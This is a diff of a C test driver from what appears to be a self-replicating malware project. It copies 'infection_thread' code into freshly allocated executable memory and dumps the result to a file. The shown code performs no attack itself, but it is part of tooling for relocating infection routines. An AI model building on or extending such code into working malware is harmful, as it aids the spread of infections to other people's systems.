@@ -5,7 +5,7 @@
 
 #include "code_begin.h"
 #include "code_end.h"
-#include "disasm/analysis/block.h"
+#include "block/copy.h"
 #include "infection_thread.h"
 #include "utility.h"
 
@@ -20,44 +20,37 @@ void free_mem(void *mem) {
     }
 }
 
-void memdump(void * addr, size_t size, const char * filename) {
-	FILE * f = fopen(filename, "w");
-	if (f != NULL) {
-		fwrite(addr, 1, size, f);
-		fclose(f);
-	}
+void memdump(void *addr, size_t size, const char *filename) {
+    FILE *f = fopen(filename, "w");
+    if (f != NULL) {
+        fwrite(addr, 1, size, f);
+        fclose(f);
+    }
 }
 
 int main(int argc, char **argv) {
     void *entrypoints[] = {(void *)spawn_infection_thread,
                            (void *)infection_thread, NULL};
 
-	PRINT_DEBUG("Collecting blocks");
-    BlockList *blocks =
-        collect_blocks(entrypoints, (void *)code_begin, (void *)code_end);
-    assert(blocks != NULL);
-    size_t code_size = get_code_size(blocks);
-    assert(code_size > 0);
-    size_t target_max_size = estimate_target_code_size(blocks);
-    assert(target_max_size > 0);
+    size_t target_size = BYTE_DIFF(code_end, code_begin) * 2;
+    assert(target_size > 0);
+    PRINT_DEBUG("Random target code size guess = %.1fkB",
+                (float)target_size / 1024.);
 
-	PRINT_DEBUG("Code size = %.1fkB", (float)code_size / 1024.);
-	PRINT_DEBUG("Estimated target code size = %.1fkB", (float)target_max_size / 1024.);
-
-	PRINT_DEBUG("Allocating target memory");
-    void *target_mem = alloc_executable(target_max_size);
+    PRINT_DEBUG("Allocating target memory");
+    void *target_mem = alloc_executable(target_size);
     assert(target_mem != NULL);
 
-	PRINT_DEBUG("Copying blocks");
-	bool copy_success = copy_blocks(blocks, target_mem, target_max_size);
-	assert(copy_success);
+    void *dest_entrypoint = discover_and_copy(entrypoints, code_begin, code_end,
+                                              target_mem, target_size);
+    assert(dest_entrypoint != NULL);
+    PRINT_DEBUG("Target entry poin is %p", dest_entrypoint);
 
-	memdump(target_mem, target_max_size, "copied_code.bin");
-
+    memdump(target_mem, target_size, "copied_code.bin");
     free_mem(target_mem);
 
-	PRINT_DEBUG("Finished");
-	fgetc(stdin);
+    PRINT_DEBUG("Finished");
+    fgetc(stdin);
 
     return 0;
 }
